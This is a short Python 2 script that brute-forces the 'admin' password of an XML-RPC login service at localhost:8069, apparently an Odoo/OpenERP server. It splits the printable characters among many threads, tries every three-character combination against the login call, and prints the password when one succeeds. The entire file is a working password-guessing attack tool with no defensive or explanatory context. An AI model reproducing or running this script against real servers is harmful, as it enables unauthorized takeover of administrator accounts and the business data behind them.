#!/usr/bin/env python

import xmlrpclib
from xmlrpclib import *
import threading
import string,math,sys

PrinTable = string.printable.replace(" ",'').replace('\t\n\r\x0b\x0c','').replace("\\",'')

class Login(threading.Thread):
    def __init__(self, thread_id,block):  
        threading.Thread.__init__(self)  
        self.thread_id = thread_id
        self.block = block
        self.thread_stop = False
    def run(self):
        for a in self.block:
            for b in list(PrinTable):
                for c in list(PrinTable):
                    SVR = ServerProxy("http://localhost:8069/xmlrpc/common")
                    password = a+b+c
                    answer = SVR.login("V7","admin",password)
                    if answer == 1 :
                        print "Finally find password : %s"%password
                        break

def chunks(arr, m):
    n = int(math.ceil(len(arr) / float(m)))
    return [arr[i:i + n] for i in range(0, len(arr), n)]

def makethread(n):
    blocks = chunks(PrinTable,n)
    threads = len(blocks)
    for thread_id in range(threads):
        thread = Login(thread_id,blocks[thread_id])
        thread.start()
    
if __name__ == '__main__':
    
    makethread(93)
